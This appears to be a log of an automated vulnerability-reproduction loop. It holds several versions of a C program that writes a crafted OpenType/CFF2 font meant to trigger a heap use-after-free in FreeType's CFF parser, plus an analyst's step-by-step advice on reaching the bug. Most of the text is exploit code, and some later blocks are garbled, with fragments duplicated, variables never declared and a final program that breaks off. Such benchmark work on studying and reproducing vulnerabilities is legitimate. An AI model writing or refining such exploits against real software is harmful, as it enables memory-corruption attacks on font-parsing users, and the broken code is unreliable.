**Extracted PoC:**
```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

/* PoC for CVE arvo:368 */
/* Triggers: heap-use-after-free in cff_parse_num (FreeType CFF parser) */
/* Vuln class: use_after_free */
/* Wraps CFF2 data inside an OpenType container with 'OTTO' sfVersion */

static void write_uint16(FILE *f, uint16_t v) {
    fputc((v >> 8) & 0xFF, f);
    fputc(v & 0xFF, f);
}

static void write_uint32(FILE *f, uint32_t v) {
    fputc((v >> 24) & 0xFF, f);
    fputc((v >> 16) & 0xFF, f);
    fputc((v >> 8) & 0xFF, f);
    fputc(v & 0xFF, f);
}

/* Write a 2-byte CFF integer (ShortInt prefix 0x1C) */
static void write_cff_shortint(FILE *f, int16_t v) {
    fputc(0x1C, f);
    fputc((v >> 8) & 0xFF, f);
    fputc(v & 0xFF, f);
}

/* Write a CFF integer in the range [0,107] using the 1-byte encoding (byte = v + 139) */
static void write_cff_byte_int(FILE *f, uint8_t v) {
    fputc(v + 139, f);
}

/* Write a CFF2 INDEX with 32-bit count. If count==0, write 4 zero bytes. */
static void write_cff2_index(FILE *f, uint32_t count, const uint8_t *data[], uint32_t lens[]) {
    write_uint32(f, count);
    if (count == 0) return;
    /* offSize: determine smallest size to hold max offset (data size + 1) */
    uint32_t total = 0;
    for (uint32_t i = 0; i < count; i++) total += lens[i];
    uint32_t max_offset = total + 1;
    uint8_t offSize = 1;
    while ((uint32_t)(1 << (offSize * 8)) <= max_offset) offSize++;
    fputc(offSize, f);
    /* Write offsets (1-based) */
    uint32_t cur = 1;
    for (uint32_t i = 0; i <= count; i++) {
        for (int b = offSize - 1; b >= 0; b--) {
            fputc((cur >> (b * 8)) & 0xFF, f);
        }
        if (i < count) cur += lens[i];
    }
    /* Write data */
    for (uint32_t i = 0; i < count; i++) {
        fwrite(data[i], 1, lens[i], f);
    }
}

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    /* ========== OpenType container ========== */
    /* sfVersion = 'OTTO' (0x4F54544F) */
    write_uint32(f, 0x4F54544F);
    /* numTables = 1 */
    write_uint16(f, 1);
    /* searchRange = 1 * 16 = 16 */
    write_uint16(f, 16);
    /* entrySelector = log2(1) = 0 */
    write_uint16(f, 0);
    /* rangeShift = 1 * 16 - 16 = 0 */
    write_uint16(f, 0);

    /* Table record placeholder: tag 'CFF2', offset, length */
    write_uint32(f, 0x43464632); /* 'CFF2' */
    long table_offset_pos = ftell(f);
    write_uint32(f, 0); /* offset placeholder */
    write_uint32(f, 0); /* length placeholder */
    long table_start = ftell(f);

    /* ========== CFF2 data ========== */
    /* CFF2 Header: major=2, minor=0, hdrSize=5, offSize=1, padding=0 */
    fputc(0x02, f);
    fputc(0x00, f);
    fputc(0x05, f);
    fputc(0x01, f); /* offSize for Top DICT */
    fputc(0x00, f); /* padding */

    /* Top DICT length placeholder (uint16) */
    long top_dict_len_pos = ftell(f);
    write_uint16(f, 0);

    /* ===== Top DICT ===== */
    long top_dict_start = ftell(f);

    /* Write CharStrings operator (17) pointing to an empty INDEX */
    write_cff_byte_int(f, 0); /* offset 0 (empty INDEX will be at end) */
    fputc(0x11, f);           /* CharStrings */

    /* Write FDArray operator (12 36) pointing to FDArray INDEX */
    /* We'll place FDArray after Top DICT, so offset = current position relative to CFF start */
    long fdarray_offset = ftell(f) - table_start + 2; /* +2 for topDictLength field? Actually no: topDictLength is before Top DICT */
    /* Actually we already wrote topDictLength at top_dict_len_pos, Top DICT starts after that. */
    /* The offset for FDArray is from the start of CFF data (table_start). */
    uint32_t fdarray_rel = ftell(f) - table_start;
    /* Write FDArray offset as a 4-byte integer using 0x1C prefix? No, use the 2-byte encoding if possible. */
    /* Since offset may be small, use 1-byte encoding if <=107, else 0x1C. */
    if (fdarray_rel <= 107) {
        write_cff_byte_int(f, fdarray_rel);
    } else {
        write_cff_shortint(f, fdarray_rel);
    }
    fputc(0x0C, f); fputc(0x24, f); /* FDArray (12 36) */

    /* Write FDSelect operator (12 37) with a dummy offset (point to empty data) */
    write_cff_byte_int(f, 0);
    fputc(0x0C, f); fputc(0x25, f); /* FDSelect */

    /* Write VariationStore operator (24) with a dummy offset */
    write_cff_byte_int(f, 0);
    fputc(0x18, f); /* vstore */

    long top_dict_end = ftell(f);
    uint16_t top_dict_len = top_dict_end - top_dict_start;
    /* Patch Top DICT length */
    fseek(f, top_dict_len_pos, SEEK_SET);
    write_uint16(f, top_dict_len);
    fseek(f, top_dict_end, SEEK_SET);

    /* ===== FDArray INDEX (CFF2 format: 32-bit count) ===== */
    /* We'll create one Font DICT that contains a Private DICT with blend operator */
    long fdarray_start = ftell(f);
    /* Build Font DICT data */
    /* Private operator: <size> <offset> where offset is from CFF start */
    /* We'll place Private DICT after FDArray */
    long private_offset = ftell(f) - table_start + 6; /* approximate, will patch */
    /* For now, write Font DICT with Private operator using placeholder offset */
    /* Font DICT content: just Private operator */
    /* Use 1-byte ints for size and offset if small */
    uint16_t private_size = 10; /* small private DICT */
    /* Write size */
    if (private_size <= 107) {
        write_cff_byte_int(f, private_size);
    } else {
        write_cff_shortint(f, private_size);
    }
    /* Write offset placeholder (will patch after we know exact offset) */
    long private_offset_pos = ftell(f);
    write_cff_byte_int(f, 0); /* placeholder */
    fputc(0x0C, f); fputc(0x24, f); /* Private operator (12 24) ? No, Private is 18 (0x12) */
    /* Actually Private DICT operator is 18 (0x12) */
    /* Rewind and fix: */
    fseek(f, private_offset_pos, SEEK_SET);
    /* Write offset as 1-byte if possible, else 0x1C */
    /* We'll compute actual private offset later */
    /* For now, write a dummy offset that we'll patch */
    write_cff_byte_int(f, 0);
    fputc(0x12, f); /* Private operator */
    long font_dict_end = ftell(f);
    uint32_t font_dict_len = font_dict_end - fdarray_start;
    /* Write FDArray as a CFF2 INDEX with one element */
    const uint8_t *fd_data[1];
    uint32_t fd_lens[1];
    /* We need to store the font dict data in memory */
    /* Re-read from file? Simpler: build font dict in memory */
    /* Since we already wrote it, let's just patch and use ftell */
    /* Actually easier: write FDArray after we know the offset. Let's restructure: */
    /* We'll write the Private DICT first, then the FDArray, then patch offsets. */
    /* But that's complex. Simpler: use a fixed small offset and patch later. */
    /* Let's compute private offset properly now. */
    /* The private DICT will be placed right after FDArray. */
    /* So private offset = (fdarray_start - table_start) + (size of FDArray INDEX) */
    /* We'll write FDArray now with a dummy offset, then patch after writing private DICT. */
    /* Actually, let's just write everything sequentially and patch at the end. */
    /* Write FDArray INDEX (one Font DICT) */
    /* First, write the Font DICT data to a temporary buffer */
    /* We'll just write the FDArray INDEX with the Font DICT containing Private operator with a placeholder offset. */
    /* Then after we write the Private DICT, we'll patch. */
    /* For simplicity, use a small private DICT that fits in 1-byte offset. */
    /* Let's compute: private DICT will be placed right after FDArray INDEX. */
    /* FDArray INDEX overhead: 4 bytes count + 1 byte offSize + (count+1)*offSize offsets + data */
    /* For 1 element: 4 + 1 + 2*1 = 7 bytes overhead, plus font dict data (say 4 bytes) = 11 bytes. */
    /* So private offset = (fdarray_start - table_start) + 11 */
    /* We'll write FDArray now with a placeholder, then write private DICT, then patch. */
    /* Write FDArray count = 1 */
    write_uint32(f, 1);
    fputc(0x01, f); /* offSize = 1 */
    /* Offsets: 1 and 1+font_dict_len */
    /* We'll write font dict data after offsets */
    fputc(0x01, f); /* offset[0] = 1 */
    /* offset[1] will be font_dict_len + 1, but we don't know it yet. Write placeholder. */
    long offset1_pos = ftell(f);
    fputc(0x00, f); /* placeholder */
    /* Now write font dict data */
    long font_dict_start = ftell(f);
    /* Write Private operator: size (small), offset (placeholder) */
    write_cff_byte_int(f, 10); /* size = 10 */
    long private_offset_in_fd_pos = ftell(f);
    write_cff_byte_int(f, 0); /* offset placeholder */
    fputc(0x12, f); /* Private operator */
    long font_dict_end2 = ftell(f);
    uint32_t font_dict_len2 = font_dict_end2 - font_dict_start;
    /* Patch offset[1] */
    fseek(f, offset1_pos, SEEK_SET);
    fputc(1 + font_dict_len2, f);
    fseek(f, font_dict_end2, SEEK_SET);

    /* Now write Private DICT */
    long private_start = ftell(f);
    /* Private DICT content: blend operator (which triggers the vulnerability) */
    /* blend operator is 12 26 (0x0C 0x1A) */
    /* It expects arguments on the stack. Write a blend operator with some arguments. */
    /* The vulnerability occurs when blend_stack is realloc'd and then parser->stack points to freed memory. */
    /* To trigger, we need to invoke blend in a way that causes a realloc and then a subsequent read of parser->stack. */
    /* Write a simple blend: push 2 values, then blend operator */
    write_cff_byte_int(f, 100); /* some value */
    write_cff_byte_int(f, 200); /* another value */
    fputc(0x0C, f); fputc(0x1A, f); /* blend operator */
    /* End of Private DICT */
    long private_end = ftell(f);
    uint32_t private_len = private_end - private_start;

    /* Patch Private offset in Font DICT */
    /* The offset is from CFF start (table_start) */
    uint32_t private_offset_val = private_start - table_start;
    fseek(f, private_offset_in_fd_pos, SEEK_SET);
    if (private_offset_val <= 107) {
        fputc(private_offset_val + 139, f);
    } else {
        /* Use 0x1C prefix (3 bytes) */
        fputc(0x1C, f);
        fputc((private_offset_val >> 8) & 0xFF, f);
        fputc(private_offset_val & 0xFF, f);
    }
    fseek(f, private_end, SEEK_SET);

    /* Also patch Private size in Font DICT (we wrote 10, but actual size may differ) */
    /* We wrote size=10, but actual private_len may be different. Patch it. */
    /* Go back to font_dict_start and rewrite size */
    fseek(f, font_dict_start, SEEK_SET);
    if (private_len <= 107) {
        fputc(private_len + 139, f);
    } else {
        fputc(0x1C, f);
        fputc((private_len >> 8) & 0xFF, f);
        fputc(private_len & 0xFF, f);
    }
    /* Skip over offset and operator */
    fseek(f, private_end, SEEK_SET);

    /* ===== CharStrings INDEX (empty) ===== */
    write_uint32(f, 0); /* count = 0 */

    /* ===== Global Subr INDEX (empty) ===== */
    write_uint32(f, 0); /* count = 0 */

    /* ===== VariationStore (dummy) ===== */
    /* Write a minimal VariationStore to satisfy parser */
    /* format = 1 (16-bit) */
    write_uint16(f, 1);
    /* variationRegionListOffset = 8 (after header) */
    write_uint32(f, 8);
    /* itemVariationDataCount = 0 */
    write_uint16(f, 0);
    /* No itemVariationDataOffsets */
    /* VariationRegionList: count=0 */
    write_uint16(f, 0); /* regionCount */
    /* No regions */

    /* ===== End of CFF data ===== */
    long table_end = ftell(f);
    uint32_t table_length = table_end - table_start;

    /* Patch table record offset and length */
    fseek(f, table_offset_pos, SEEK_SET);
    write_uint32(f, (uint32_t)table_start);
    write_uint32(f, table_length);

    fclose(f);
    return 0;
}

**Feedback to next attempt:**
```
The PoC executed but did not trigger the vulnerability.
Senior Engineer Analysis:
Given the tool turn constraints, I must output my final analysis now.

**Confirmed Values:**
- `cff_blend_doBlend` source code confirmed at `/src/freetype2/src/cff/cffload.c:1273`
- `cff_parse_blend` source code confirmed at `/src/freetype2/src/cff/cffparse.c:875`
- fuzz target `LLVMFuzzerTestOneInput` confirmed at `/src/freetype2/src/tools/ftfuzzer/ftfuzzer.cc:172`

**Root Cause Analysis:**

The PoC failed to reach the vulnerable `cff_blend_doBlend` code path due to two independent structural errors in the generated CFF2 data:

1. **Incorrect FDArray offset in Top DICT.**  
   The generator computes `fdarray_rel` at the time it writes the FDArray operator (12 36), but at that point the FDArray INDEX has not yet been written to the file. The computed offset points to a location within the Top DICT itself rather than to the actual FDArray INDEX data. FreeType's CFF2 parser will attempt to read the FDArray INDEX at this wrong offset, fail the bounds/parsing check, and return an error before any Private DICT or blend operator is ever processed.

2. **No operator after the blend operator to trigger the use-after-free.**  
   After the blend operator completes, the Private DICT ends immediately. The vulnerability is a heap-use-after-free in `cff_parse_num`, which is called when the *next* token after the blend operator is parsed (specifically, when reading a number from the stack pointer that has become dangling due to the reallocation of `blend_stack` inside `cff_blend_doBlend`). Without a subsequent operand (e.g., another integer push or an operator that pops stack values), the parser exits the Private DICT without making any further calls to `cff_parse_num`, so the dangling pointer is never dereferenced.

**Required Changes to the Generator:**

1. **Fix the FDArray offset.**  
   The offset value written for the FDArray operator (12 36) in the Top DICT must be the byte offset from the start of the CFF2 data to the beginning of the FDArray INDEX. Since the FDArray INDEX is written after the Top DICT, the generator must first compute the size of the Top DICT, then write the operator with the correct offset (i.e., `offset = top_dict_start - table_start + top_dict_len`), or use a two-pass approach: write the Top DICT with a placeholder, write the FDArray INDEX, then go back and patch the placeholder with the real offset.

2. **Add a number push after the blend operator in the Private DICT.**  
   Immediately after the two-byte blend operator (0x0C 0x1A), the generator must write an additional integer (e.g., 0) using the same CFF encoding. This integer push will trigger `cff_parse_num` after the blend has already reallocated `blend_stack`, causing the use-after-free.

3. **(Optional) Provide valid FDSelect and VariationStore offsets.**  
   These are minor; the parsing may still fail if the Top DICT contains these operators with offset 0. To be safe, point them to valid (possibly empty) data structures.

**Conclusion:**
The PoC must be modified to (a) compute the FDArray offset correctly so that the CFF2 parser can reach the Private DICT, and (b) include an additional integer operand after the blend operator so that the dangling pointer is actually read by `cff_parse_num`. Without both fixes, the vulnerable code path will remain unreachable.

=== CRITIQUE REQUIRED ===
Before writing the updated C code, you MUST write a short paragraph of analysis. Read the fuzzer output provided above and explain EXACTLY why the previous payload was rejected or failed to reach the vulnerable code. State your new strategy clearly, and THEN output the C code.
```

**Extracted PoC:**
```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

static void write_uint16(FILE *f, uint16_t v) {
    fputc((v >> 8) & 0xFF, f);
    fputc(v & 0xFF, f);
}

static void write_uint32(FILE *f, uint32_t v) {
    fputc((v >> 24) & 0xFF, f);
    fputc((v >> 16) & 0xFF, f);
    fputc((v >> 8) & 0xFF, f);
    fputc(v & 0xFF, f);
}

static void write_cff_byte_int(FILE *f, uint8_t v) {
    fputc(v + 139, f);
}

static void write_cff_shortint(FILE *f, int16_t v) {
    fputc(0x1C, f);
    fputc((v >> 8) & 0xFF, f);
    fputc(v & 0xFF, f);
}

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    /* OpenType header */
    write_uint32(f, 0x4F54544F); /* sfVersion = 'OTTO' */
    write_uint16(f, 1);          /* numTables = 1 */
    write_uint16(f, 16);         /* searchRange */
    write_uint16(f, 0);          /* entrySelector */
    write_uint16(f, 0);          /* rangeShift */

    /* Table record for 'CFF2' */
    write_uint32(f, 0x43464632); /* tag = 'CFF2' */
    long table_offset_pos = ftell(f);
    write_uint32(f, 0);          /* offset placeholder */
    write_uint32(f, 0);          /* length placeholder */
    long table_start = ftell(f); /* CFF2 data starts here */

    /* CFF2 Header (5 bytes) */
    fputc(0x02, f); /* major = 2 */
    fputc(0x00, f); /* minor = 0 */
    fputc(0x05, f); /* hdrSize = 5 */
    fputc(0x01, f); /* offSize = 1 */
    fputc(0x00, f); /* padding */

    /* Top DICT length placeholder (2 bytes) */
    long top_dict_len_pos = ftell(f);
    write_uint16(f, 0);

    /* ---- Top DICT ---- */
    long top_dict_start = ftell(f);

    /* Write FDArray operator (12 36) with placeholder offset (4 bytes using 0x1C prefix) */
    /* Placeholder value: 0x1C, 0x00, 0x00 */
    long fdarray_op_pos = ftell(f);
    fputc(0x1C, f); fputc(0x00, f); fputc(0x00, f); /* placeholder for offset */
    fputc(0x0C, f); fputc(0x24, f); /* FDArray operator */

    /* Write FDSelect operator (12 37) pointing to an empty data block */
    write_cff_byte_int(f, 0);
    fputc(0x0C, f); fputc(0x25, f);

    /* Write CharStrings operator (17) pointing to an empty INDEX */
    write_cff_byte_int(f, 0);
    fputc(0x11, f);

    /* Write VariationStore operator (24) pointing to an empty structure */
    write_cff_byte_int(f, 0);
    fputc(0x18, f);

    long top_dict_end = ftell(f);
    uint16_t top_dict_len = top_dict_end - top_dict_start;
    fseek(f, top_dict_len_pos, SEEK_SET);
    write_uint16(f, top_dict_len);
    fseek(f, top_dict_end, SEEK_SET);

    /* ---- FDArray INDEX (CFF2 format: 32-bit count) ---- */
    long fdarray_start = ftell(f);
    /* Patch FDArray offset in Top DICT */
    uint32_t fdarray_offset = fdarray_start - table_start;
    fseek(f, fdarray_op_pos, SEEK_SET);
    fputc(0x1C, f);
    fputc((fdarray_offset >> 8) & 0xFF, f);
    fputc(fdarray_offset & 0xFF, f);
    fseek(f, fdarray_start, SEEK_SET);

    /* Write FDArray INDEX with one Font DICT */
    write_uint32(f, 1);          /* count = 1 */
    fputc(0x01, f);              /* offSize = 1 */
    fputc(0x01, f);              /* offset[0] = 1 */
    long offset1_pos = ftell(f);
    fputc(0x00, f);              /* offset[1] placeholder */

    /* Font DICT data */
    long font_dict_start = ftell(f);
    /* Private operator: <size> <offset> */
    write_cff_byte_int(f, 20);   /* size placeholder (will patch) */
    long priv_offset_pos = ftell(f);
    write_cff_byte_int(f, 0);    /* offset placeholder */
    fputc(0x12, f);              /* Private operator */
    long font_dict_end = ftell(f);
    uint32_t font_dict_len = font_dict_end - font_dict_start;

    /* Patch offset[1] in FDArray INDEX */
    fseek(f, offset1_pos, SEEK_SET);
    fputc(1 + font_dict_len, f);
    fseek(f, font_dict_end, SEEK_SET);

    /* ---- Private DICT ---- */
    long private_start = ftell(f);
    /* Push values for blend (numBlends = 2, so push 5*2 = 10 values? Actually blend expects: numBlends, then for each blend: n values + n values? */
    /* The blend operator (12 26) reads: numBlends, then for each blend: n values + n values */
    /* We'll push: numBlends=2, then 2 values for first blend, then 2 values for second blend */
    write_cff_byte_int(f, 2);    /* numBlends */
    write_cff_byte_int(f, 10);   /* value 1a */
    write_cff_byte_int(f, 20);   /* value 1b */
    write_cff_byte_int(f, 30);   /* value 2a */
    write_cff_byte_int(f, 40);   /* value 2b */
    fputc(0x0C, f); fputc(0x1A, f); /* blend operator */
    /* After blend, push an integer to trigger cff_parse_num on dangling pointer */
    write_cff_byte_int(f, 0);    /* this push will cause the use-after-free */
    long private_end = ftell(f);
    uint32_t private_len = private_end - private_start;

    /* Patch Private DICT size and offset in Font DICT */
    uint32_t private_offset = private_start - table_start;
    fseek(f, font_dict_start, SEEK_SET);
    if (private_len <= 107) {
        fputc(private_len + 139, f);
    } else {
        fputc(0x1C, f);
        fputc((private_len >> 8) & 0xFF, f);
        fputc(private_len & 0xFF, f);
    }
    fseek(f, priv_offset_pos, SEEK_SET);
    if (private_offset <= 107) {
        fputc(private_offset + 139, f);
    } else {
        fputc(0x1C, f);
        fputc((private_offset >> 8) & 0xFF, f);
        fputc(private_offset & 0xFF, f);
    }
    fseek(f, private_end, SEEK_SET);

    /* ---- CharStrings INDEX (empty) ---- */
    write_uint32(f, 0);

    /* ---- Global Subr INDEX (empty) ---- */
    write_uint32(f, 0);

    /* ---- VariationStore (dummy) ---- */
    write_uint16(f, 1);          /* format = 1 */
    write_uint32(f, 8);          /* variationRegionListOffset = 8 */
    write_uint16(f, 0);          /* itemVariationDataCount = 0 */
    write_uint16(f, 0);          /* regionCount = 0 */

    /* ---- End of CFF2 data ---- */
    long table_end = ftell(f);
    uint32_t table_length = table_end - table_start;

    /* Patch table record offset and length */
    fseek(f, table_offset_pos, SEEK_SET);
    write_uint32(f, (uint32_t)table_start);
    write_uint32(f, table_length);

    fclose(f);
    return 0;
}

#include <stdint.h>

static void write_uint16(FILE *f, uint16_t v) {
    fputc((v >> 8) & 0xFF, f);
    fputc(v & 0xFF, f);
}

static void write_uint32(FILE *f, uint32_t v) {
    fputc((v >> 24) & 0xFF, f);
    fputc((v >> 16) & 0xFF, f);
    fputc((v >> 8) & 0xFF, f);
    fputc(v & 0xFF, f);
}

    fputc(v + 139, f);
}

static void write_cff_shortint(FILE *f, int16_t v) {
    fputc(0x1C, f);
    fputc((v >> 8) & 0xFF, f);
    fputc(v & 0xFF, f);

The real issue is that the blend operator in CFF2 requires a VariationStore to be present and valid, and the parser validates t...

**Extracted PoC:**
```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

static void write_uint16(FILE *f, uint16_t v) {
    fputc((v >> 8) & 0xFF, f);
    fputc(v & 0xFF, f);
}

static void write_uint32(FILE *f, uint32_t v) {
    fputc((v >> 24) & 0xFF, f);
    fputc((v >> 16) & 0xFF, f);
    fputc((v >> 8) & 0xFF, f);
    fputc(v & 0xFF, f);
}

static void write_cff_byte_int(FILE *f, uint8_t v) {
    fputc(v + 139, f);
}

static void write_cff_shortint(FILE *f, int16_t v) {
    fputc(0x1C, f);
    fputc((v >> 8) & 0xFF, f);
    fputc(v & 0xFF, f);
}

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    /* OpenType header */
    write_uint32(f, 0x4F54544F); /* sfVersion = 'OTTO' */
    write_uint16(f, 1);          /* numTables = 1 */
    write_uint16(f, 16);         /* searchRange */
    write_uint16(f, 0);          /* entrySelector */

    write_uint32(f, 0x43464632); /* tag = 'CFF2' */
    long table_offset_pos = ftell(f);
    write_uint32(f, 0);          /* offset placeholder */
    write_uint32(f, 0);          /* length placeholder */
    long table_start = ftell(f); /* CFF2 data starts here */

    /* CFF2 Header (5 bytes) */
    fputc(0x02, f); /* major = 2 */
    fputc(0x00, f); /* minor = 0 */
    fputc(0x05, f); /* hdrSize = 5 */
    fputc(0x01, f); /* offSize = 1 */
    fputc(0x00, f); /* padding */

    /* Top DICT length placeholder (2 bytes) */
    long top_dict_len_pos = ftell(f);
    write_uint16(f, 0);

    long top_dict_start = ftell(f);

    /* Write FDArray operator (12 36) with placeholder offset */

    write_cff_byte_int(f, 0);
    fputc(0x11, f);

    fputc(0x18, f); /* vstore */

    uint16_t top_dict_len = top_dict_end - top_dict_start;
    fseek(f, top_dict_len_pos, SEEK_SET);
    write_uint16(f, top_dict_len);
    fseek(f, top_dict_end, SEEK_SET);

    fputc((fdarray_offset >> 8) & 0xFF, f);
    fputc(fdarray_offset & 0xFF, f);
    fseek(f, fdarray_start, SEEK_SET);

    write_uint32(f, 1);          /* count = 1 */
    fputc(0x01, f);              /* offSize = 1 */

    /* Font DICT */
    long font_dict_start = ftell(f);
    write_cff_byte_int(f, 200);  /* size placeholder */
    long priv_offset_pos = ftell(f);
    write_cff_byte_int(f, 0);    /* offset placeholder */
    fputc(0x12, f);              /* Private operator */
    long font_dict_end = ftell(f);
    uint32_t font_dict_len = font_dict_end - font_dict_start;

    fseek(f, offset1_pos, SEEK_SET);
    fputc(1 + font_dict_len, f);
    fseek(f, font_dict_end, SEEK_SET);

    /* ---- Private DICT ---- */
    long private_start = ftell(f);
    /* Push numBlends = 1 (small, but still triggers realloc if blend_used + 5 > blend_alloc) */
    /* blend_alloc starts at 0, so even 5 will trigger realloc */
    write_cff_byte_int(f, 1);    /* numBlends */
    /* Push 5 values (5 * 1) */
    write_cff_byte_int(f, 10);
    write_cff_byte_int(f, 20);
    write_cff_byte_int(f, 30);
    write_cff_byte_int(f, 40);
    write_cff_byte_int(f, 50);
    fputc(0x0C, f); fputc(0x1A, f); /* blend operator */
    /* After blend, push integer to trigger use-after-free */
    write_cff_byte_int(f, 0);
    long private_end = ftell(f);
    uint32_t private_len = private_end - private_start;

    uint32_t private_offset = private_start - table_start;
    fseek(f, font_dict_start, SEEK_SET);
    if (private_len <= 107) {
        fputc(private_len + 139, f);
    } else {
        fputc(0x1C, f);
        fputc((private_len >> 8) & 0xFF, f);
        fputc(private_len & 0xFF, f);
    }
    fseek(f, priv_offset_pos, SEEK_SET);
    if (private_offset <= 107) {
        fputc(private_offset + 139, f);
    } else {
        fputc(0x1C, f);
        fputc((private_offset >> 8) & 0xFF, f);
        fputc(private_offset & 0xFF, f);
    }
    fseek(f, private_end, SEEK_SET);

    /* ---- CharStrings INDEX (empty) ---- */
    write_uint32(f, 0);

    /* ---- Global Subr INDEX (empty) ---- */
    write_uint32(f, 0);

    /* ---- VariationStore ---- */
    long vstore_start = ftell(f);
    uint32_t vstore_offset = vstore_start - table_start;
    fseek(f, vstore_op_pos, SEEK_SET);
    fputc(0x1C, f);
    fputc((vstore_offset >> 8) & 0xFF, f);
    fputc(vstore_offset & 0xFF, f);
    fseek(f, vstore_start, SEEK_SET);

    /* Build a valid VariationStore (format 1) */
    /* Header: format (16-bit), variationRegionListOffset (32-bit), itemVariationDataCount (16-bit) */
    write_uint16(f, 1);          /* format = 1 */
    /* variationRegionListOffset: from start of VariationStore to VariationRegionList */
    uint32_t vrl_offset = 8;     /* after header (2+4+2=8 bytes) */
    write_uint32(f, vrl_offset);
    write_uint16(f, 1);          /* itemVariationDataCount = 1 */
    /* itemVariationDataOffset[0]: from start of VariationStore to first ItemVariationData */
    uint32_t ivd_offset = 8 + 8; /* header + VRL size (approx) */
    /* Actually we need to compute properly. Write placeholder and patch later. */
    long ivd_offset_pos = ftell(f);
    write_uint32(f, 0);          /* placeholder */

    /* VariationRegionList */
    long vrl_start = ftell(f);
    /* regionAxisCount = 1 */
    write_uint16(f, 1);
    /* RegionCount = 1 */
    write_uint16(f, 1);
    /* Region: startCoord, peakCoord, endCoord (each 16-bit fixed 2.14) */
    write_uint16(f, 0);          /* start = 0 */
    write_uint16(f, 16384);      /* peak = 1.0 in 2.14 (16384) */
    write_uint16(f, 16384);      /* end = 1.0 */
    long vrl_end = ftell(f);
    uint32_t vrl_size = vrl_end - vrl_start;

    /* ItemVariationData */
    long ivd_start = ftell(f);
    /* Patch itemVariationDataOffset */
    uint32_t ivd_offset_val = ivd_start - vstore_start;
    fseek(f, ivd_offset_pos, SEEK_SET);
    write_uint32(f, ivd_offset_val);
    fseek(f, ivd_start, SEEK_SET);

    /* itemCount = 1 (16-bit) */
    write_uint16(f, 1);
    /* wordDeltaCount = 0 (16-bit, high bit = 0 means no long deltas) */
    write_uint16(f, 0);
    /* regionIndexCount = 1 (16-bit) */
    write_uint16(f, 1);
    /* regionIndexes: one index = 0 (16-bit) */
    write_uint16(f, 0);
    /* deltaSet: one delta (16-bit) */
    write_uint16(f, 0);

    long table_end = ftell(f);
    uint32_t table_length = table_end - table_start;

    fseek(f, table_offset_pos, SEEK_SET);
    write_uint32(f, (uint32_t)table_start);
    write_uint32(f, table_length);

    fclose(f);
    return 0;
}

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

static void write_uint16(FILE *f, uint16_t v) {
    fputc((v >> 8) & 0xFF, f);
    fputc(v & 0xFF, f);
}

static void write_uint32(FILE *f, uint32_t v) {
    fputc((v >> 24) & 0xFF, f);
    fputc((v >> 16) & 0xFF, f);
    fputc((v >> 8) & 0xFF, f);
    fputc(v & 0xFF, f);
}

static void write_cff_byte_int(FILE *f, uint8_t v) {
    fputc(v + 139, f);
}

static void write_cff_shortint(FILE *f, int16_t v) {
    fputc(0x1C, f);
    fputc((v >> 8) & 0xFF, f);
    fputc(v & 0xFF, f);
}

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    /* OpenType header */
    write_uint32(f, 0x4F54544F); /* sfVersion = 'OTTO' */
    write_uint16(f, 1);          /* numTables = 1 */
    write_uint16(f, 16);         /* searchRange */
    write_uint16(f, 0);          /* entrySelector */
    write_uint16(f, 0);          /* rangeShift */

    /* Table record for 'CFF2' */
    write_uint32(f, 0x43464632); /* tag = 'CFF2' */
    long table_offset_pos = ftell(f);
    write_uint32(f, 0);          /* offset placeholder */
    write_uint32(f, 0);          /* length placeholder */
    long table_start = ftell(f); /* CFF2 data starts here */

    /* CFF2 Header (5 bytes) */
    fputc(0x02, f); /* major = 2 */
    fputc(0x00, f); /* minor = 0 */
    fputc(0x05, f); /* hdrSize = 5 */
    fputc(0x01, f); /* offSize = 1 */
    fputc(0x00, f); /* padding */

    /* Top DICT length placeholder (2 bytes) */
    long top_dict_len_pos = ftell(f);
    write_uint16(f, 0);

    /* ---- Top DICT ---- */
    long top_dict_start = ftell(f);

    /* Write FDArray operator (12 36) with placeholder offset */
    long fdarray_op_pos = ftell(f);
    fputc(0x1C, f); fputc(0x00, f); fputc(0x00, f); /* placeholder */
    fputc(0x0C, f); fputc(0x24, f); /* FDArray */

    /* Write FDSelect operator (12 37) with placeholder offset for valid FDSelect */
    long fdselect_op_pos = ftell(f);
    fputc(0x1C, f); fputc(0x00, f); fputc(0x00, f); /* placeholder */
    fputc(0x0C, f); fputc(0x25, f); /* FDSelect */

    /* Write CharStrings operator (17) pointing to empty INDEX */
    write_cff_byte_int(f, 0);
    fputc(0x11, f);

    /* Write VariationStore operator (24) with placeholder offset */
    long vstore_op_pos = ftell(f);
    fputc(0x1C, f); fputc(0x00, f); fputc(0x00, f); /* placeholder */
    fputc(0x18, f); /* vstore */

    long top_dict_end = ftell(f);
    uint16_t top_dict_len = top_dict_end - top_dict_start;
    fseek(f, top_dict_len_pos, SEEK_SET);
    write_uint16(f, top_dict_len);
    fseek(f, top_dict_end, SEEK_SET);

    /* ---- FDArray INDEX ---- */
    long fdarray_start = ftell(f);
    uint32_t fdarray_offset = fdarray_start - table_start;
    fseek(f, fdarray_op_pos, SEEK_SET);
    fputc(0x1C, f);
    fputc((fdarray_offset >> 8) & 0xFF, f);
    fputc(fdarray_offset & 0xFF, f);
    fseek(f, fdarray_start, SEEK_SET);

    write_uint32(f, 1);          /* count = 1 */
    fputc(0x01, f);              /* offSize = 1 */
    fputc(0x01, f);              /* offset[0] = 1 */
    long offset1_pos = ftell(f);
    fputc(0x00, f);              /* offset[1] placeholder */

    /* Font DICT */
    long font_dict_start = ftell(f);
    write_cff_byte_int(f, 200);  /* size placeholder */
    long priv_offset_pos = ftell(f);
    write_cff_byte_int(f, 0);    /* offset placeholder */
    fputc(0x12, f);              /* Private operator */
    long font_dict_end = ftell(f);
    uint32_t font_dict_len = font_dict_end - font_dict_start;

    fseek(f, offset1_pos, SEEK_SET);
    fputc(1 + font_dict_len, f);
    fseek(f, font_dict_end, SEEK_SET);

    /* ---- FDSelect ---- */
    long fdselect_start = ftell(f);
    uint32_t fdselect_offset = fdselect_start - table_start;
